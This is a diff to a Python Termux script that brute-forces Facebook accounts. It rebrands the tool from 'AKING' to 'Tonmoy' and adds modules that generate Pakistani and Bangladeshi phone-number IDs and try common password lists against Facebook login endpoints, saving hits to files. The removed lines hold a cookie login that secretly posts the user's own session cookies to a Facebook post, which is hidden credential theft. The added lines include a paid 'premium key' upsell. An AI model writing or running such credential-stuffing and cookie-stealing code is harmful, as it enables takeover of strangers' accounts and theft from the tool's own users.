@@ -1,7 +1,3 @@
-#SOURCE LEAKED BY :MR-AUH
-#REASON : BECAUSE LOL BADSHAH
-#WAS INTERFERE BETWEEN
-#AWAIS & LKING FIGHT 😎 
 from os import path
 import os,base64,zlib,pip,urllib
 os.system('xdg-open https://facebook.com/groups/351076900316263/')
@@ -14,7 +10,7 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python AKING.py')
+        os.system('python Tonmoy.py')
 except:pass
         
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
@@ -61,7 +57,7 @@ logo=("""
 \033[1;37mTOOL  : \033[1;32mFILE CRACK                                                                        
 \033[1;37m ══════════════════════════════════════════════════\033[1;37m""")
 def linex():
-        print('\033[1;37m----------------------------------------------')
+	print('\033[1;37m══════════════════════════════════════════════════')
 def clear():
         os.system('clear')
         print(logo)
@@ -71,51 +67,19 @@ cps=[]
 pcp=[]
 id=[]
 tokenku=[]
-def login():
-        clear()
-        cookies = input(' Put cookies: ')
-        try:
-                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
-                find_token = re.search("(EAAG\w+)", data.text)
-                open(".tok.txt", "w").write(find_token.group(1))
-                open(".coki.txt","w").write(cookies)
-                tok=open('.tok.txt','r').read()
-                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
-                name=(info['name'])
-                idd=(info['id'])
-                barth=(info['birthday'])
-                linex()
-                print(' Welcome\033[1;32m : '+name)
-                print(' \033[1;37mYour UID : '+idd)
-                print(' Barth Day: '+barth)
-                requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
-                linex()
-                print(' Cookies login has been successfull...')
-                time.sleep(1)
-                menu()
-        except KeyError:
-                print('\033[1;31m Cookies has been expired...')
-                os.system('rm -rf .tok.txt');time.sleep(1);login()
-        except requests.exceptions.ConnectionError:
-                exit(' internet connection error...')
-        except AttributeError:
-                print('\033[1;31m Cookies has been expired...')
-                os.system('rm -rf .tok.txt');time.sleep(1);login()
-                login()
 def menu():
         try:
                 clear()
         #       chk()
                 x = ("sex")
                 if x == ("sex"):
-                        print(' [1] File cloning\n [2] Create ids file\n [3] Public cloning\n [4] Random number cloning\n [5] Random gmail crack\n [6] WhatsApp Group (join)\n [7] Download Vpn\n [8] How To Use Video\n [0] Exit menu')
-                        linex()
+                        print(' [1] \033[1;32mFile \033[1;37mcloning\n [2] \033[1;32mRandom \033[1;37mcloning\n [0] \033[1;32mEx\033[1;37mit')
                         xd=input(' Choose an option: ')
                         if xd in ['1','01']:
                                 clear()
                                 print(' Put file example:  /sdcard/File.txt  etc..')
                                 linex()
-                                file = input(' Put file path\033[1;37m: ')
+                                file = input(' Put file path\033[1;32m: ')
                                 try:
                                         fo = open(file,'r').read().splitlines()
                                 except FileNotFoundError:
@@ -168,15 +132,111 @@ def menu():
                                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                 linex()
                                 input(' Press enter to back ')
-                                os.system('python AKING.py')
+                                os.system('python Tonmoy.py')
+                        elif xd in ['2','02']:
+                                clear()
+                                print(' [1] Pakistan cloning\n [2] Bangladesh cloningn [0] Back menu')
+                                linex()
+                                x=input(' Choose: ')
+                                if x in ['1','01']:
+                                        pak()
+                                elif x in ['2','02']:
+                                        bd()
+                                else:
                                         menu()
                         elif xd in ['0','00']:
-                                exit(' Thanks for use 🥰 ')
+                                exit
                         else:
                                 exit(' Option not found in menu...')
+                else:
+                        print("\033[1;31m Your Not Premium User...!\033[1;37m");time.sleep(1)
+                        clear()
+                        print('\033[1;31m First Read Note : ')
+                        print("\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")
+                        linex()
+                        print(' \033[1;31mYour Key Not Registered\033[1;37m')
+                        print(f" \033[1;37mYour Key : {fkeyx}")
+                        linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
+                        linex()
+                        input(" Choose Option : ")
+                        linex()
+                        print(" Your Subscription Date Expire")
+                        linex()
+                        url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
+                        name = input(" Enter your Name : ")
+                        linex()
+                        tks = ("Hi Tonmoy Sir, I Need To Buy Your Paid Tonmoy PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
+                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
+                        print(' Run :  python Tonmoy.py')
+                        exit()
+        except ValueError:
+                exit()
+        except requests.exceptions.ConnectionError:
+                print('\n No internet connection ...')
+                exit()
+def pak():
+                user=[]
+                clear()
+                print('\033[1;31m Code example: 0306,0315,0335,0345')
+                code = input('\033[1;37m put code: ')
+                try:
+                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with tred(max_workers=30) as Tonmoy:     
+                        clear()
+                        tl = str(len(user))
+                        print(' Total account : \033[1;32m'+tl)
+                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
+                        print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
+                        linex()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
+                                Tonmoy.submit(rndm,ids,passlist)
+                print('\033[1;37m')
+                linex()
+                print(' The process has completed')
+                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                linex()
+                input(' Press enter to back ')
+                os.system('python Tonmoy.py')
+def bd():
+                user=[]
+                clear()
+                print('\033[1;31m Code example: 016,017,018,019')
+                code = input('\033[1;37m put code: ')
+                try:
+                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+                        user.append(nmp)
+                with tred(max_workers=30) as Tonmoy:     
+                        clear()
+                        tl = str(len(user))
+                        print(' Total account : \033[1;32m'+tl)
+                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
+                        print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
+                        linex()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
+                                Tonmoy.submit(rndm,ids,passlist)
+                print('\033[1;37m')
+                linex()
+                print(' The process has completed')
+                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                linex()
+                input(' Press enter to back ')
+                os.system('python Tonmoy.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [TONMOY] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -193,18 +253,18 @@ def ffb(ids,names,passlist):
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Aking=session.cookies.get_dict().keys()
-                        if "c_user" in Aking:
+                        Tonmoy=session.cookies.get_dict().keys()
+                        if "c_user" in Tonmoy:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [AKING-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/AKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print('\r\r\033[1;32m [TONMOY-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/TONMOY-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in Aking:
+                        elif 'checkpoint' in Tonmoy:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;208m [TONMOY-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/TONMOY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -218,7 +278,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [TONMOY] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -268,14 +328,14 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [TONMOY-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/TONMOY-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [TONMOY-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/TONMOY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -288,7 +348,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [TONMOY] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -338,18 +398,18 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [TONMOY-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/TONMOY-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\\033[1;30m [TONMOY-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/TONMOY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/AKING-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/TONMOY-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -361,7 +421,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [TONMOY] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -407,16 +467,16 @@ def rndm(ids,passlist):
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
                                         try:
-                                                okk=open('/sdcard/AKING-OK.txt','r').read()
+                                                okk=open('/sdcard/TONMOY-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m [AKING-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                        open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        print('\r\r\033[1;32m [TONMOY-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                        open('/sdcard/TONMOY-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [AKING-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                print('\r\r\033[1;32m [TONMOY-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/TONMOY-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
